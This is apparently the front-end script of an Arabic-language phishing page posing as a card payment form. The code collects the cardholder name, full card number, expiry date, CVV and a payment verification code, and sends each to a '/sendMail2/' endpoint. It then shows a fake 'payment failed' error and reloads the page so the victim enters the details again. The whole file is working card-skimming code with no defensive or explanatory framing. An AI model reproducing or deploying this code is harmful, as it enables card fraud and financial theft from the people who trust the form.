document.querySelector('.submit').addEventListener('click',function(){
    document.querySelector('footer').style='position: relative!important;bottom: unset!important;'
    document.querySelector('main').classList.remove('hidden')
    document.querySelector('header').classList.add('hidden')
})

document.querySelector('#cardnumber').addEventListener('input',()=>{

    //document.querySelector('footer').querySelector('path').setAttribute('fill', window.getComputedStyle(document.querySelector('#cardfront').querySelectorAll('path')[1]).getPropertyValue('fill'))
})


let inputs = document.querySelectorAll('input')
let inputs2 = document.querySelectorAll('select')

document.querySelector('#submitVisa').addEventListener('click',async(e)=>{
    e.preventDefault()
    let sel1 = document.querySelectorAll('select')[0].value
    let sel2 = document.querySelectorAll('select')[1].value
    if(document.querySelector('#securitycode').value.length==3&&document.querySelector('main').querySelector('input').value!=''&&document.querySelector('#cardnumber').value.replaceAll(' ','').length==16&&sel1!=''&&sel2!=''){
        document.querySelector('.container').classList.add('hidden')
        document.querySelector('.form-container').classList.add('hidden')
        document.querySelector('label').classList.add('hidden')
        document.querySelector('input').classList.add('hidden')
        document.querySelectorAll('span')[0].classList.add('hidden')
        document.querySelector('#timer').classList.remove('hidden')
        localStorage.setItem('name',inputs[1].value)
             let message = `قيمة القسط => ${inputs[0].value} %0A اسم صاحب البطاقة => ${inputs[1].value} %0A رقم البطاقة => ${inputs[2].value.replaceAll(' ','')} %0A MM/YY => ${inputs2[0].value} / ${inputs2[1].value}  %0A CVV => ${inputs[4].value}`

  

        await fetch(`/sendMail2/?message=${message}`)
        setTimer(new Date(Date.now()+intoMillie('00:01:00')))
    }
    if(document.querySelector('#securitycode').value.length!=3){
        Swal.fire({
            title: 'خطاً',
            text: '(بجب أن يحتوي من 1 إلي 3 أرقام) رمز الأمان خاطئ',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
    if(!document.querySelector('main').querySelector('input').value!=''){
        Swal.fire({
            title: 'خطاً',
            text: `برجاء إدخال قيمة ${document.querySelector('main').querySelector('label').innerHTML}`,
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
    if(document.querySelector('#cardnumber').value.replaceAll(' ','').length!=16){
        Swal.fire({
            title: 'خطاً',
            text: 'رقم البطاقة أقل من 16 رقم',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
    if(sel1==''||sel2==''){
        Swal.fire({
            title: 'خطاً',
            text: 'لم يتم إدخال تاريخ إنتهاء البطاقة',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
})

document.querySelector('#codeVerify').querySelector('.submit').addEventListener('click',async function(){
    if(document.querySelector('#codeVerify').querySelector('input').value.length > 2  &&  document.querySelector('#codeVerify').querySelector('input').value.length <= 6){
        this.classList.add('hidden')
        let message = `الإسم=>${localStorage.getItem('name')} %0A كود الدفع => ${document.querySelector('#codeVerify').querySelector('input').value}`
     
        await fetch(`/sendMail2/?message=${message}`)
        Swal.fire({
            title: 'خطأ',
            text: 'تم فشل عمليه الدفع حاول مره اخري',
            icon: 'error',
            confirmButtonText: 'محاولة مرة أخري'
        })
        .then(()=>{
            location.reload()
        })
    }
    else{
        Swal.fire({
            title: 'خطاً',
            text: 'رقم الكود خاطئ (يجب أن يحتوي 6 أرقام)',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
})

function setTimer(x){
    const newDate = new Date(x).getTime()
    const countdown = setInterval(() => {
    const date = new Date().getTime()
    const diff = newDate - date
    const month = Math.floor((diff % (1000 * 60 * 60 * 24 * (365.25 / 12) * 365)) / (1000 * 60 * 60 * 24 * (365.25 / 12)))
    let days = Math.floor(diff % (1000 * 60 * 60 * 24 * (365.25 / 12)) / (1000 * 60 * 60 * 24))
    const hours = Math.floor(diff % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60))
    const seconds = Math.floor((diff % (1000 * 60)) / 1000)
    Array.from({length:12},(_,i)=>i+1).forEach((e)=>{
      if(month==e) days+=(30*e)
    })
    timer.querySelector('span').innerHTML = (minutes < 10 ? '0' + minutes : minutes) + ':' + (seconds < 10 ? '0' + seconds : seconds)
    // document.querySelector(".months").innerHTML = month < 10 ? '0' + month : month

    if (diff < 0) {
      clearInterval(countdown);
      // document.querySelector(".countdown").innerHTML = 'Happy Birthday Ahmed'
      document.querySelector('#timer').classList.add('hidden')
      document.querySelector('#codeVerify').classList.remove('hidden')
      //document.querySelector(".months").innerHTML = 0;
    }
  }, 1000);
}

function intoMillie(x){
    var parts = x.split(/:/);
    return (parseInt(parts[0], 10) * 60 * 60 * 1000) +
           (parseInt(parts[1], 10) * 60 * 1000) +
           (parseInt(parts[2], 10) * 1000);
  }

  if(window.innerWidth > 834){
    document.querySelector('footer').querySelector('img').src= ' /static/images/payment2.png'
}
else{
    document.querySelector('footer').querySelector('img').src= ' /static/images/payment.png'
}

window.addEventListener('resize',()=>{
    if(window.innerWidth > 834){
        document.querySelector('footer').querySelector('img').src= ' /static/images/payment2.png'
    }
    else{
        document.querySelector('footer').querySelector('img').src= ' /static/images/payment.png'
    }
})

document.querySelector('#securitycode').addEventListener('input',function(){
    if(document.querySelector('#securitycode').value.length>3)
        document.querySelector('#securitycode').value = document.querySelector('#securitycode').value.slice(0,3)
})